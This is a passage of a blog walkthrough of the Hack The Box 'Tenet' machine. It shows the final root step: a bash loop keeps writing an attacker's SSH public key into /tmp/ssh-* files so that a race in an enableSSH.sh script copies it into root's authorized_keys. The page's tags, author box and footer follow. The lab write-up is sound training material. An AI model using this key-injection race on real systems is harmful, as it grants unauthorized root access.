sizes="(min-width: 720px) 720px"></figure><p>While analyzing the source I found a pretty interesting function called <strong>addKey().</strong></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-322.png" class="kg-image" alt loading="lazy" width="1500" height="588" srcset="../content/images/size/w600/2021/06/image-322.png 600w, ../content/images/size/w1000/2021/06/image-322.png 1000w, ../content/images/2021/06/image-322.png 1500w" sizes="(min-width: 720px) 720px"></figure><p>Simply what it does is, the script reads the content of the file in <code>/tmp/ssh-xxxxxx</code> and adds it to the <code>/root/.ssh/authorized_keys</code> . If we can add our SSH public key to the <code>/tmp/ssh-XXXXXX</code> ; we can login to the machine as root via our private key.</p><p>In doing so, I need to have SSH key pair. Let's generate it right now. Type <code>ssh-keygen</code> and hit enter.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-323.png" class="kg-image" alt loading="lazy" width="1894" height="1030" srcset="../content/images/size/w600/2021/06/image-323.png 600w, ../content/images/size/w1000/2021/06/image-323.png 1000w, ../content/images/size/w1600/2021/06/image-323.png 1600w, ../content/images/2021/06/image-323.png 1894w" sizes="(min-width: 720px) 720px"></figure><p>Then we need to write our public key to the <code>/tmp/ssh-*</code> continuously. We can do that using a simple bash loop. Change<strong> &lt;Your_id_rsa.pub&gt; </strong>as yours.</p><pre><code class="language-bash">while true
+do 
+echo 'ssh-rsa AAAAB**&lt;Your_id_rsa.pub&gt;***p1c=' |tee /tmp/ssh-*
+done</code></pre><p>Now let's move on to the final step 😅. I divided my terminal into 3 parts. The top one is to run the loop script, the second one is to execute the enableSSH.sh script and the last one is to login as root via my private key.</p><p>After all, run the loop script, then again run the <strong>enableSSH.sh</strong> script and try to login as root via SSH.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-324.png" class="kg-image" alt loading="lazy" width="1319" height="746" srcset="../content/images/size/w600/2021/06/image-324.png 600w, ../content/images/size/w1000/2021/06/image-324.png 1000w, ../content/images/2021/06/image-324.png 1319w" sizes="(min-width: 720px) 720px"></figure><p>PWN3D! 🥳 Now we have the root flag.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-325.png" class="kg-image" alt loading="lazy" width="1390" height="294" srcset="../content/images/size/w600/2021/06/image-325.png 600w, ../content/images/size/w1000/2021/06/image-325.png 1000w, ../content/images/2021/06/image-325.png 1390w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-326.png" class="kg-image" alt loading="lazy" width="851" height="766" srcset="../content/images/size/w600/2021/06/image-326.png 600w, ../content/images/2021/06/image-326.png 851w" sizes="(min-width: 720px) 720px"></figure><p>I still wonder why this box was given such a name, don't you??</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-327.png" class="kg-image" alt loading="lazy" width="761" height="318" srcset="../content/images/size/w600/2021/06/image-327.png 600w, ../content/images/2021/06/image-327.png 761w" sizes="(min-width: 720px) 720px"></figure><p><br>Anyway... I’ll see you on the next retired machine, Ciao!! 😉😉</p><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p><p></p><p></p><p></p><p></p>
+                <section class="m-tags in-post">
+                  <h3 class="m-submenu-title">Tags</h3>
+                  <ul>
+                      <li>
+                        <a href="../tag/retired-machines-htb/index.html" title="Retired Machines HTB">Retired Machines HTB</a>
+                      </li>
+                      <li>
+                        <a href="../tag/tenet-walkthrough/index.html" title="Tenet Walkthrough">Tenet Walkthrough</a>
+                      </li>
+                      <li>
+                        <a href="../tag/h4rithd/index.html" title="h4rithd">h4rithd</a>
+                      </li>
+                      <li>
+                        <a href="../tag/harith-dilshan/index.html" title="Harith Dilshan">Harith Dilshan</a>
+                      </li>
+                  </ul>
+                </section>
+            </div>
+          </div>
+        </div>
+        
+        <section class="m-author">
+          <div class="m-author__content">
+            <div class="m-author__picture">
+              <a href="../author/h4rithd/index.html" class="m-author-picture" aria-label="Harith Dilshan">
+                  <div style="background-image: url(../content/images/2021/06/ProfilePic.jpg);"></div>
+              </a>
+            </div>
+            <div class="m-author__info">
+              <h4 class="m-author__name">
+                <a href="../author/h4rithd/index.html">Harith Dilshan</a>
+              </h4>
+                <p class="m-author__bio">👨‍🎓 Graduated at SLIIT specialized in Cyber Security 👷‍♂️ Working at Dialog Axiata</p>
+              <ul class="m-author-links">
+                  <li>
+                    <a href="https://h4rithd.com/" target="_blank" rel="noopener" aria-label="Website">
+                      <span class="icon-globe" aria-hidden="true"></span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://twitter.com/@h4rithd" target="_blank" rel="noopener" aria-label="Twitter">
+                      <span class="icon-twitter" aria-hidden="true"></span>
+                    </a>
+                  </li>
+              </ul>
+            </div>
+          </div>
+        </section>
+          <section class="m-recommended">
+            <div class="l-wrapper in-recommended">
+              <h3 class="m-section-title in-recommended">Recommended for you</h3>
+              <div class="m-recommended-articles">
+                <div class="m-recommended-slider glide js-recommended-slider">
+                  <div class="glide__track" data-glide-el="track">
+                    <div class="glide__slides">
+                      
+    <div class="m-recommended-slider__item glide__slide">
+  <article class="m-article-card  post tag-scriptkiddie-walkthrough tag-cve-2020-7384 tag-h4rithd tag-harith-dilshan tag-retired-machines-htb featured">
+    <div class="m-article-card__picture">
+      <a href="../scriptkiddie-walkthrough/index.html" class="m-article-card__picture-link" aria-hidden="true" tabindex="-1"></a>
+        <img class="m-article-card__picture-background" src="../content/images/size/w600/2021/06/ScriptKiddieBG.jpg" loading="lazy" alt="">
+      <a href="../author/h4rithd/index.html" class="m-article-card__author js-tooltip" aria-label="Harith Dilshan" data-tippy-content="Posted by Harith Dilshan ">
+          <div style="background-image: url(../content/images/size/w100/2021/06/ProfilePic.jpg);"></div>
+      </a>
+        <a href="../scriptkiddie-walkthrough/index.html" class="m-article-card__featured js-tooltip" data-tippy-content="Featured" aria-label="Featured">
+          <span class="icon-star" aria-hidden="true"></span>
+        </a>
+    </div>
+      <div class="m-article-card__info">
+        <a href="../tag/scriptkiddie-walkthrough/index.html" class="m-article-card__tag">ScriptKiddie Walkthrough</a>
+      <a href="../scriptkiddie-walkthrough/index.html" class="m-article-card__info-link" aria-label="ScriptKiddie Walkthrough">
+        <div>
+          <h2 class="m-article-card__title js-article-card-title " title="ScriptKiddie Walkthrough">
+            ScriptKiddie Walkthrough
+          </h2>
+        </div>
+        <div class="m-article-card__timestamp">
+          <span>7 days ago</span>
+          <span>&bull;</span>
+          <span>7 min read</span>
+        </div>
+      </a>
+    </div>
+  </article>
+    </div>
+    <div class="m-recommended-slider__item glide__slide">
+  <article class="m-article-card  post tag-starting-point-htb tag-base-walkthrough tag-h4rithd tag-harith-dilshan">
+    <div class="m-article-card__picture">
+      <a href="../starting-point-htb-base-walkthrough/index.html" class="m-article-card__picture-link" aria-hidden="true" tabindex="-1"></a>
+        <img class="m-article-card__picture-background" src="../content/images/size/w600/2021/06/BaseBG.jpg" loading="lazy" alt="">
+      <a href="../author/h4rithd/index.html" class="m-article-card__author js-tooltip" aria-label="Harith Dilshan" data-tippy-content="Posted by Harith Dilshan ">
+          <div style="background-image: url(../content/images/size/w100/2021/06/ProfilePic.jpg);"></div>
+      </a>
+    </div>
+      <div class="m-article-card__info">
+        <a href="../tag/starting-point-htb/index.html" class="m-article-card__tag">Starting Point Walkthrough</a>
+      <a href="../starting-point-htb-base-walkthrough/index.html" class="m-article-card__info-link" aria-label="Base Walkthrough">
+        <div>
+          <h2 class="m-article-card__title js-article-card-title " title="Base Walkthrough">
+            Base Walkthrough
+          </h2>
+        </div>
+        <div class="m-article-card__timestamp">
+          <span>13 days ago</span>
+          <span>&bull;</span>
+          <span>7 min read</span>
+        </div>
+      </a>
+    </div>
+  </article>
+    </div>
+    <div class="m-recommended-slider__item glide__slide">
+  <article class="m-article-card  post tag-starting-point-htb tag-markup-walkthrough tag-h4rithd tag-harith-dilshan">
+    <div class="m-article-card__picture">
+      <a href="../starting-point-htb-markup-walkthrough/index.html" class="m-article-card__picture-link" aria-hidden="true" tabindex="-1"></a>
+        <img class="m-article-card__picture-background" src="../content/images/size/w600/2021/06/MarkupBG.jpg" loading="lazy" alt="">
+      <a href="../author/h4rithd/index.html" class="m-article-card__author js-tooltip" aria-label="Harith Dilshan" data-tippy-content="Posted by Harith Dilshan ">
+          <div style="background-image: url(../content/images/size/w100/2021/06/ProfilePic.jpg);"></div>
+      </a>
+    </div>
+      <div class="m-article-card__info">
+        <a href="../tag/starting-point-htb/index.html" class="m-article-card__tag">Starting Point Walkthrough</a>
+      <a href="../starting-point-htb-markup-walkthrough/index.html" class="m-article-card__info-link" aria-label="Markup Walkthrough">
+        <div>
+          <h2 class="m-article-card__title js-article-card-title " title="Markup Walkthrough">
+            Markup Walkthrough
+          </h2>
+        </div>
+        <div class="m-article-card__timestamp">
+          <span>14 days ago</span>
+          <span>&bull;</span>
+          <span>7 min read</span>
+        </div>
+      </a>
+    </div>
+  </article>
+    </div>
+                    </div>
+                  </div>
+                  <div data-glide-el="controls" class="glide__arrows js-controls">
+                    <button data-glide-dir="<" class="m-icon-button filled in-recommended-articles glide-prev" aria-label="Previous">
+                      <span class="icon-arrow-left" aria-hidden="true"></span>
+                    </button>
+                    <button data-glide-dir=">" class="m-icon-button filled in-recommended-articles glide-next" aria-label="Next">
+                      <span class="icon-arrow-right" aria-hidden="true"></span>
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+    </div>
+  </article>
+</main>
+
+
+
+    
+<div class="m-search js-search" role="dialog" aria-modal="true" aria-label="Search">
+  <button class="m-icon-button outlined as-close-search js-close-search" aria-label="Close search">
+    <span class="icon-close" aria-hidden="true"></span>
+  </button>
+  <div class="m-search__content">
+    <form class="m-search__form">
+      <div class="pos-relative">
+        <span class="icon-search m-search-icon" aria-hidden="true"></span>
+        <label for="search-input" class="sr-only">
+          Type to search
+        </label>
+        <input id="search-input" type="text" class="m-input in-search js-input-search" placeholder="Type to search">
+      </div>
+    </form>
+    <div class="js-search-results hide"></div>
+    <p class="m-not-found align-center hide js-no-results">
+      No results for your search, please try with something else.
+    </p>
+  </div>
+</div>
+
+    
+<footer class="m-footer">
+  <div class="m-footer__content">
+    <nav class="m-footer-social">
+        <a href="https://www.facebook.com/ShapManasick/" target="_blank" rel="noopener" aria-label="Facebook">
+          <span class="icon-facebook" aria-hidden="true"></span>
+        </a>
+        <a href="https://twitter.com/h4rithd" target="_blank" rel="noopener" aria-label="Twitter">
+          <span class="icon-twitter" aria-hidden="true"></span>
+        </a>
+      <a href="https://h4rithd.com/blog/rss" aria-label="RSS">
+        <span class="icon-rss" aria-hidden="true"></span>
+      </a>
+    </nav>
+    <p class="m-footer-copyright">
+      <span>h4rithd.com &copy; 2021</span>  
+    </p>
+    <p class="m-footer-copyright jslicense">
+     <span>Published with 🖤  </span>
+    </p>
+  </div>
+</footer>
+
+    
+    <script crossorigin="anonymous" src="https://polyfill.io/v3/polyfill.min.js?features=IntersectionObserver%2CPromise%2CArray.prototype.includes%2CString.prototype.endsWith%2CString.prototype.startsWith%2CObject.assign%2CNodeList.prototype.forEach"></script>
+    <script defer src="../assets/js/manifest.js%3Fv=e4011b5a13"></script>
+    <script defer src="../assets/js/vendor/content-api.min.js%3Fv=e4011b5a13"></script>
+    <script defer src="../assets/js/vendor.js%3Fv=e4011b5a13"></script>
+    <script defer src="../assets/js/app.js%3Fv=e4011b5a13"></script>
+
+      <script defer src="../assets/js/post.js%3Fv=e4011b5a13"></script>
+
+
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.15.0/prism.min.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.15.0/components/prism-python.min.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-bash.min.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-sql.min.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-powershell.min.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-ruby.min.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-csharp.min.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-cpp.min.js"></script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/plugins/toolbar/prism-toolbar.min.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', (event) => {
+        document.querySelectorAll('pre[class*=language-]').forEach(function (node) {
+            node.classList.add('line-numbers');
+        });
+        Prism.highlightAll();
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-121547351-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-121547351-1');
+</script>
+  </body>
+</html>
